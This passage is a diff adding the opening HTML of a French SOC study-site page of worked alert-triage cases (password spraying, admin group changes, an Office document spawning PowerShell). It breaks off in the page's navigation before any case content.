@@ -1,0 +1,3490 @@
+
+<!doctype html>
+<html lang="fr" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Environnement d'étude SOC / Threat Hunting / Detection Engineering (HTB CDSA, MITRE ATT&CK Defender)">
+      
+      
+      
+        <link rel="canonical" href="https://tommyweemox.github.io/HTB_CDSA_TR/cdsa/01-siem/08-cas-travailles/">
+      
+      
+        <link rel="prev" href="../07-elastic-kibana/">
+      
+      
+        <link rel="next" href="../09-labs/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Cas travaillés - SOC Lab — CDSA & MAD ATT&CK</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/quiz.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#8-cas-travailles" class="md-skip">
+          Aller au contenu
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="En-tête">
+    <a href="../../.." title="SOC Lab — CDSA &amp; MAD ATT&amp;CK" class="md-header__button md-logo" aria-label="SOC Lab — CDSA & MAD ATT&CK" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            SOC Lab — CDSA & MAD ATT&CK
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cas travaillés
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Mode clair"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Mode clair" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Mode sombre"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Mode sombre" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Recherche">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initialisation de la recherche
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/TommyWeemox/HTB_CDSA_TR" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Accueil
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../study-plan/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Plan d'étude
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  HTB CDSA
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../mad/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  MITRE ATT&CK Defender
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../hunting/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Threat Hunting
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../detection-engineering/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Detection Engineering
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../cheatsheets/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Cheatsheets
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../labs/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Labs
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../resources/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Ressources
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="SOC Lab — CDSA &amp; MAD ATT&amp;CK" class="md-nav__button md-logo" aria-label="SOC Lab — CDSA & MAD ATT&CK" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    SOC Lab — CDSA & MAD ATT&CK
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/TommyWeemox/HTB_CDSA_TR" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Accueil
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../study-plan/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Plan d'étude
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Plan d'étude
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study-plan/12-weeks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Planning 12 semaines
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study-plan/progress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Suivi de progression
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../study-plan/quizzes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tableau de bord des quiz
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB CDSA
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HTB CDSA
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exam/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Examen
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. SOC, SIEM & Monitoring
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_3" id="__nav_3_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    1. SOC, SIEM & Monitoring
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-soc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Le SOC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture d'un SIEM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-use-cases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Use cases & détection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-triage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Triage & investigation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-metrics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Métriques & maturité
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-logs-annotes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lire un log (annoté)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-elastic-kibana/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Elastic & Kibana pas à pas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cas travaillés
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cas travaillés
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cas-a-password-spraying-declenche-a-0200" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas A : « Password spraying » déclenché à 02:00
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas A : « Password spraying » déclenché à 02:00">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#donnees" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Données
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indices-a-relever" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indices à relever
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cas-b-ajout-au-groupe-administrateurs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas B : Ajout au groupe Administrateurs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas B : Ajout au groupe Administrateurs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#questions-a-te-poser" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions à te poser
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#donnees_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Données
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cas-c-document-office-qui-lance-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas C : Document Office qui lance PowerShell
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas C : Document Office qui lance PowerShell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-1-levenement" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 1 : l'événement
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-2-decoder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 2 : décoder
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-3-pivoter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 3 : pivoter
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cas-d-lalerte-qui-naurait-jamais-du-etre-silencieuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas D : l'alerte qui n'aurait jamais dû être silencieuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas D : l&#39;alerte qui n&#39;aurait jamais dû être silencieuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#contexte" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contexte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-verifier" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        À vérifier
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recapitulatif" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Récapitulatif
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#erreurs-frequentes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Erreurs fréquentes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#a-retenir" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        À retenir
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../09-labs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Labs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-quiz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quiz
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-windows-event-logs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Event Logs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-threat-hunting-elastic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Hunting (Elastic)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../04-splunk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-windows-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attaques Windows & défense
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-network-traffic-analysis/" class="md-nav__link">
